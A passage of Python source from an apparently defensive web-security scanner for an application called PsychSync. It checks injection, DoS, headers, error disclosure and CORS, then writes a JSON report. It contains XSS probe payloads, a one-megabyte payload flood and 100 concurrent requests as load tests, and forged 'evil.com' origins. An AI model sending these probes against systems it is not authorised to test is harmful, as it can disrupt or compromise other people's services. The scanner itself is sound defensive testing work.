            "<script>console.log('test')</script>",  # XSS
            "javascript:alert('test')",  # XSS
        ]

        for payload in additional_payloads:
            try:
                for endpoint_name, endpoint_path in self.test_endpoints.items():
                    if endpoint_name in ["users", "assessments"]:
                        params = {"search": payload, "name": payload}

                        async with self.session.get(
                            urljoin(self.base_url, endpoint_path),
                            params=params,
                            headers={"User-Agent": "Security-Test-Scanner"},
                        ) as response:
                            content = await response.text()

                            # Check for payload execution
                            if "49" in content or "console.log" in content:
                                self.add_result(
                                    test_name="OWASP A03 - Additional Injection",
                                    result=TestResult.CRITICAL,
                                    description=f"Injection vulnerability detected with payload: {payload}",
                                    evidence=[
                                        f"Payload: {payload}",
                                        f"Endpoint: {endpoint_path}",
                                    ],
                                    recommendation="Implement comprehensive input validation and output encoding",
                                    cvss_score=7.2,
                                    owasp_category="A03:2021 – Injection",
                                )

            except Exception as e:
                self.logger.error(
                    f"Error testing additional injection payload {payload}: {e}"
                )

    async def test_performance_security(self):
        """Test performance-related security issues"""
        self.logger.info("⚡ Testing Performance Security")

        # Test for DoS vulnerabilities
        await self.test_dos_vulnerabilities()

        # Test resource exhaustion
        await self.test_resource_exhaustion()

    async def test_dos_vulnerabilities(self):
        """Test Denial of Service vulnerabilities"""
        self.logger.info("Testing DoS vulnerabilities...")

        try:
            # Test with large payloads
            large_payload = "A" * 1000000  # 1MB payload

            for endpoint_name, endpoint_path in self.test_endpoints.items():
                if endpoint_name in ["users", "assessments"]:
                    post_data = {"name": large_payload, "description": large_payload}

                    start_time = time.time()
                    async with self.session.post(
                        urljoin(self.base_url, endpoint_path),
                        json=post_data,
                        headers={"User-Agent": "Security-Test-Scanner"},
                    ) as response:
                        response_time = time.time() - start_time

                        if response_time > 10:  # More than 10 seconds
                            self.add_result(
                                test_name="DoS - Slow Response",
                                result=TestResult.WARNING,
                                description=f"Slow response to large payload: {response_time:.2f}s",
                                evidence=[
                                    f"Response time: {response_time:.2f}s",
                                    f"Payload size: {len(large_payload)} bytes",
                                ],
                                recommendation="Implement request size limits and rate limiting",
                                cvss_score=4.3,
                                owasp_category="A05:2021 – Security Misconfiguration",
                            )

        except Exception as e:
            self.logger.error(f"Error testing DoS vulnerabilities: {e}")

    async def test_resource_exhaustion(self):
        """Test resource exhaustion vulnerabilities"""
        self.logger.info("Testing resource exhaustion...")

        try:
            # Test with many concurrent requests
            concurrent_requests = 100
            tasks = []

            for _ in range(concurrent_requests):
                task = self.session.get(
                    urljoin(self.base_url, self.test_endpoints["health"]),
                    headers={"User-Agent": "Security-Test-Scanner"},
                )
                tasks.append(task)

            start_time = time.time()
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            total_time = time.time() - start_time

            successful_responses = sum(
                1 for r in responses if hasattr(r, "status") and 200 <= r.status < 400
            )

            if (
                successful_responses < concurrent_requests * 0.8
            ):  # Less than 80% success rate
                self.add_result(
                    test_name="Resource Exhaustion",
                    result=TestResult.WARNING,
                    description=f"High failure rate under load: {successful_responses}/{concurrent_requests}",
                    evidence=[
                        f"Success rate: {successful_responses/concurrent_requests:.1%}",
                        f"Total time: {total_time:.2f}s",
                    ],
                    recommendation="Implement better resource management and rate limiting",
                    cvss_score=4.3,
                    owasp_category="A05:2021 – Security Misconfiguration",
                )

        except Exception as e:
            self.logger.error(f"Error testing resource exhaustion: {e}")

    async def test_security_headers(self):
        """Test security headers implementation"""
        self.logger.info("🌐 Testing Security Headers")

        try:
            critical_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": ["DENY", "SAMEORIGIN"],
                "X-XSS-Protection": "1; mode=block",
                "Strict-Transport-Security": "max-age=",
                "Content-Security-Policy": "default-src",
                "Referrer-Policy": [
                    "strict-origin-when-cross-origin",
                    "strict-origin",
                    "no-referrer",
                ],
            }

            for endpoint_name, endpoint_path in self.test_endpoints.items():
                async with self.session.get(
                    urljoin(self.base_url, endpoint_path),
                    headers={"User-Agent": "Security-Test-Scanner"},
                ) as response:
                    headers = response.headers

                    for header_name, expected_values in critical_headers.items():
                        if header_name not in headers:
                            self.add_result(
                                test_name=f"Missing Security Header - {header_name}",
                                result=TestResult.WARNING,
                                description=f"Missing security header: {header_name}",
                                evidence=[f"Endpoint: {endpoint_path}"],
                                recommendation=f"Add {header_name} header for enhanced security",
                                cvss_score=3.6,
                                owasp_category="A05:2021 – Security Misconfiguration",
                            )
                        else:
                            header_value = headers[header_name]
                            if isinstance(expected_values, list):
                                if not any(
                                    expected in header_value
                                    for expected in expected_values
                                ):
                                    self.add_result(
                                        test_name=f"Security Header Value - {header_name}",
                                        result=TestResult.WARNING,
                                        description=f"Incorrect {header_name} header value: {header_value}",
                                        evidence=[
                                            f"Expected one of: {expected_values}"
                                        ],
                                        recommendation=f"Set {header_name} to recommended value",
                                        cvss_score=2.5,
                                        owasp_category="A05:2021 – Security Misconfiguration",
                                    )

        except Exception as e:
            self.logger.error(f"Error testing security headers: {e}")

    async def test_production_readiness(self):
        """Test production readiness"""
        self.logger.info("📊 Testing Production Readiness")

        # Test debug mode
        await self.test_debug_mode()

        # Test error handling
        await self.test_error_handling()

    async def test_debug_mode(self):
        """Test that debug mode is disabled in production"""
        self.logger.info("Testing debug mode...")

        try:
            # Trigger an error to see debug information
            async with self.session.get(
                urljoin(self.base_url, "/api/v1/nonexistent-endpoint"),
                headers={"User-Agent": "Security-Test-Scanner"},
            ) as response:
                content = await response.text()

                debug_indicators = [
                    "traceback",
                    "debug",
                    "stack trace",
                    "exception details",
                    "internal server error",
                    "application error",
                ]

                debug_found = False
                for indicator in debug_indicators:
                    if indicator in content.lower():
                        debug_found = True
                        break

                if debug_found:
                    self.add_result(
                        test_name="Debug Mode",
                        result=TestResult.CRITICAL,
                        description="Debug information leaked in error responses",
                        evidence=["Debug information in response"],
                        recommendation="Disable debug mode in production",
                        cvss_score=5.3,
                        owasp_category="A05:2021 – Security Misconfiguration",
                    )
                else:
                    self.add_result(
                        test_name="Debug Mode Disabled",
                        result=TestResult.PASS,
                        description="Debug mode properly disabled",
                        evidence=["No debug information in error response"],
                    )

        except Exception as e:
            self.logger.error(f"Error testing debug mode: {e}")

    async def test_error_handling(self):
        """Test secure error handling"""
        self.logger.info("Testing secure error handling...")

        try:
            # Test various error conditions
            error_endpoints = [
                "/api/v1/nonexistent",
                "/api/v1/users/999999",
                "/api/v1/assessments/invalid-id",
            ]

            for endpoint in error_endpoints:
                async with self.session.get(
                    urljoin(self.base_url, endpoint),
                    headers={"User-Agent": "Security-Test-Scanner"},
                ) as response:
                    content = await response.text()

                    # Check for information disclosure
                    sensitive_info_patterns = [
                        r"internal server error",
                        r"database error",
                        r"sql.*error",
                        r"traceback",
                        r"stack trace",
                        r"file path",
                        r"line \d+",
                    ]

                    for pattern in sensitive_info_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            self.add_result(
                                test_name="Error Information Disclosure",
                                result=TestResult.WARNING,
                                description=f"Sensitive information in error response: {pattern}",
                                evidence=[
                                    f"Pattern found: {pattern}",
                                    f"Endpoint: {endpoint}",
                                ],
                                recommendation="Implement secure error handling without information disclosure",
                                cvss_score=4.3,
                                owasp_category="A05:2021 – Security Misconfiguration",
                            )

        except Exception as e:
            self.logger.error(f"Error testing error handling: {e}")

    async def test_integration_security(self):
        """Test integration security"""
        self.logger.info("🔗 Testing Integration Security")

        # Test API versioning security
        await self.test_api_versioning()

        # Test CORS configuration
        await self.test_cors_configuration()

    async def test_api_versioning(self):
        """Test API versioning security"""
        self.logger.info("Testing API versioning security...")

        try:
            version_endpoints = ["/api/v1/", "/api/v2/", "/api/latest/", "/api/v0/"]

            for endpoint in version_endpoints:
                async with self.session.get(
                    urljoin(self.base_url, endpoint),
                    headers={"User-Agent": "Security-Test-Scanner"},
                ) as response:
                    # Check if old versions are still accessible
                    if response.status == 200 and "v0" in endpoint or "v1" in endpoint:
                        self.add_result(
                            test_name="API Version Security",
                            result=TestResult.INFO,
                            description=f"API version accessible: {endpoint}",
                            evidence=[f"Status: {response.status}"],
                            recommendation="Consider deprecating old API versions",
                            cvss_score=2.0,
                            owasp_category="A06:2021 – Vulnerable and Outdated Components",
                        )

        except Exception as e:
            self.logger.error(f"Error testing API versioning: {e}")

    async def test_cors_configuration(self):
        """Test CORS configuration security"""
        self.logger.info("Testing CORS configuration...")

        try:
            # Test CORS with various origins
            test_origins = [
                "http://evil.com",
                "https://malicious-site.org",
                "null",
                "http://localhost:3000",
            ]

            for origin in test_origins:
                headers = {"Origin": origin, "User-Agent": "Security-Test-Scanner"}

                async with self.session.options(
                    urljoin(self.base_url, self.test_endpoints["users"]),
                    headers=headers,
                ) as response:
                    cors_header = response.headers.get(
                        "Access-Control-Allow-Origin", ""
                    )

                    if cors_header == "*" or (
                        origin not in ["http://localhost:3000"]
                        and cors_header == origin
                    ):
                        self.add_result(
                            test_name="CORS Configuration",
                            result=TestResult.WARNING,
                            description=f"Insecure CORS policy accepting origin: {origin}",
                            evidence=[
                                f"Origin: {origin}",
                                f"Allowed-Origin: {cors_header}",
                            ],
                            recommendation="Configure CORS to only allow trusted origins",
                            cvss_score=4.7,
                            owasp_category="A05:2021 – Security Misconfiguration",
                        )

        except Exception as e:
            self.logger.error(f"Error testing CORS configuration: {e}")

    def add_result(
        self,
        test_name: str,
        result: TestResult,
        description: str,
        evidence: List[str] = None,
        recommendation: str = None,
        cvss_score: float = None,
        owasp_category: str = None,
    ):
        """Add security test result"""
        result_obj = SecurityTestResult(
            test_name=test_name,
            result=result,
            description=description,
            evidence=evidence or [],
            recommendation=recommendation,
            cvss_score=cvss_score,
            owasp_category=owasp_category,
        )
        self.results.append(result_obj)

        # Log result
        level = {
            TestResult.PASS: logging.INFO,
            TestResult.INFO: logging.INFO,
            TestResult.WARNING: logging.WARNING,
            TestResult.FAIL: logging.ERROR,
            TestResult.CRITICAL: logging.CRITICAL,
        }.get(result, logging.INFO)

        self.logger.log(level, f"[{result.value}] {test_name}: {description}")

    async def generate_comprehensive_report(self) -> Dict[str, Any]:
        """Generate comprehensive security validation report"""
        self.logger.info("Generating comprehensive security report...")

        # Analyze results
        total_tests = len(self.results)
        passed = sum(1 for r in self.results if r.result == TestResult.PASS)
        failed = sum(
            1
            for r in self.results
            if r.result in [TestResult.FAIL, TestResult.CRITICAL]
        )
        warnings = sum(1 for r in self.results if r.result == TestResult.WARNING)
        info = sum(1 for r in self.results if r.result == TestResult.INFO)

        # Calculate security score
        security_score = ((passed + info) / total_tests * 100) if total_tests > 0 else 0

        # Critical issues summary
        critical_issues = [r for r in self.results if r.result == TestResult.CRITICAL]

        # OWASP compliance analysis
        owasp_compliance = {}
        for result in self.results:
            if result.owasp_category:
                if result.owasp_category not in owasp_compliance:
                    owasp_compliance[result.owasp_category] = {"passed": 0, "failed": 0}

                if result.result == TestResult.PASS:
                    owasp_compliance[result.owasp_category]["passed"] += 1
                else:
                    owasp_compliance[result.owasp_category]["failed"] += 1

        # Generate recommendations
        recommendations = []
        for result in self.results:
            if result.recommendation and result.result in [
                TestResult.CRITICAL,
                TestResult.WARNING,
            ]:
                recommendations.append(
                    {
                        "issue": result.test_name,
                        "recommendation": result.recommendation,
                        "priority": (
                            "HIGH" if result.result == TestResult.CRITICAL else "MEDIUM"
                        ),
                    }
                )

        report = {
            "execution_metadata": {
                "timestamp": datetime.utcnow().isoformat(),
                "framework_version": "1.0 Enterprise Security Suite",
                "target_url": self.base_url,
                "total_tests_executed": total_tests,
                "execution_time_seconds": (
                    (datetime.utcnow() - self.results[0].timestamp).total_seconds()
                    if self.results
                    else 0
                ),
            },
            "executive_summary": {
                "overall_security_score": round(security_score, 2),
                "security_grade": self._calculate_grade(security_score),
                "total_tests": total_tests,
                "passed_tests": passed,
                "failed_tests": failed,
                "warning_tests": warnings,
                "info_tests": info,
                "critical_issues_count": len(critical_issues),
                "production_ready": len(critical_issues) == 0,
            },
            "security_findings": {
                "critical_vulnerabilities": [
                    {
                        "name": r.test_name,
                        "description": r.description,
                        "evidence": r.evidence,
                        "recommendation": r.recommendation,
                        "cvss_score": r.cvss_score,
                        "owasp_category": r.owasp_category,
                    }
                    for r in critical_issues
                ],
                "high_priority_warnings": [
                    {
                        "name": r.test_name,
                        "description": r.description,
                        "evidence": r.evidence,
                        "recommendation": r.recommendation,
                        "cvss_score": r.cvss_score,
                    }
                    for r in self.results
                    if r.result == TestResult.WARNING
                ],
            },
            "owasp_compliance_analysis": owasp_compliance,
            "recommendations": sorted(recommendations, key=lambda x: x["priority"]),
            "detailed_results": [
                {
                    "test_name": r.test_name,
                    "result": r.result.value,
                    "description": r.description,
                    "evidence": r.evidence,
                    "recommendation": r.recommendation,
                    "cvss_score": r.cvss_score,
                    "owasp_category": r.owasp_category,
                    "timestamp": r.timestamp.isoformat(),
                }
                for r in self.results
            ],
            "production_readiness_checklist": self._generate_readiness_checklist(),
            "next_steps": {
                "immediate_actions": [
                    "Address all CRITICAL vulnerabilities immediately",
                    "Implement recommended security fixes",
                    "Schedule a follow-up security assessment",
                    "Set up continuous security monitoring",
                ],
                "long_term_improvements": [
                    "Implement comprehensive security logging",
                    "Set up security incident response procedures",
                    "Regular security assessments and penetration testing",
                    "Security awareness training for development team",
                ],
            },
        }

        # Save report to file
        report_file = f"security_validation_report_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, "w") as f:
            json.dump(report, f, indent=2, default=str)

        self.logger.info(f"Security validation report saved to: {report_file}")

        return report

    def _calculate_grade(self, score: float) -> str:
        """Calculate security grade based on score"""
        if score >= 95:
            return "A+ (Excellent)"
        elif score >= 90:
            return "A (Very Good)"
        elif score >= 80:
            return "B (Good)"
        elif score >= 70:
            return "C (Fair)"
        elif score >= 60:
            return "D (Poor)"
        else:
            return "F (Critical)"

    def _generate_readiness_checklist(self) -> Dict[str, bool]:
        """Generate production readiness checklist"""
        return {
            "authentication_security": len(
                [
                    r
                    for r in self.results
                    if "Authentication" in r.test_name
                    and r.result == TestResult.CRITICAL
                ]
            )
            == 0,
            "input_validation": len(
                [
                    r
                    for r in self.results
                    if "Injection" in r.test_name and r.result == TestResult.CRITICAL
                ]
            )
            == 0,
            "authorization_controls": len(
                [
                    r
                    for r in self.results
                    if "Authorization" in r.test_name
                    and r.result == TestResult.CRITICAL
                ]
            )
            == 0,
            "security_headers": len(
                [
                    r
                    for r in self.results
                    if "Security Headers" in r.test_name
                    and r.result == TestResult.CRITICAL
                ]
            )
            == 0,
            "error_handling": len(
                [
                    r
                    for r in self.results
                    if "Error" in r.test_name and r.result == TestResult.CRITICAL
                ]
            )
            == 0,
            "rate_limiting": len(
                [
                    r
                    for r in self.results
                    if "Rate Limiting" in r.test_name
                    and r.result == TestResult.CRITICAL
                ]
            )
            == 0,
            "password_policy": len(
                [
                    r
                    for r in self.results
                    if "Password" in r.test_name and r.result == TestResult.CRITICAL
                ]
            )
            == 0,
            "jwt_security": len(
                [
                    r
                    for r in self.results
                    if "JWT" in r.test_name and r.result == TestResult.CRITICAL
                ]
            )
            == 0,
        }


async def main():
    """Main execution function"""
    framework = SecurityValidationFramework()
    report = await framework.run_all_tests()

    print("\n" + "=" * 80)
    print("🔒 PSYCHSYNC SECURITY VALIDATION REPORT")
    print("=" * 80)
    print(f"Security Score: {report['executive_summary']['overall_security_score']}%")
    print(f"Security Grade: {report['executive_summary']['security_grade']}")
    print(f"Total Tests: {report['executive_summary']['total_tests']}")
    print(f"Passed: {report['executive_summary']['passed_tests']}")
    print(f"Failed: {report['executive_summary']['failed_tests']}")
    print(f"Warnings: {report['executive_summary']['warning_tests']}")
    print(f"Critical Issues: {report['executive_summary']['critical_issues_count']}")
    print(
        f"Production Ready: {'✅ YES' if report['executive_summary']['production_ready'] else '❌ NO'}"
    )

    if report["executive_summary"]["critical_issues_count"] > 0:
        print("\n🚨 CRITICAL VULNERABILITIES FOUND:")
        for vuln in report["security_findings"]["critical_vulnerabilities"]:
            print(f"  • {vuln['name']}: {vuln['description']}")

    print("\n📋 Production Readiness Checklist:")
    for item, ready in report["production_readiness_checklist"].items():
        status = "✅" if ready else "❌"
        print(f"  {status} {item.replace('_', ' ').title()}")

    print("\n" + "=" * 80)


if __name__ == "__main__":
    asyncio.run(main())
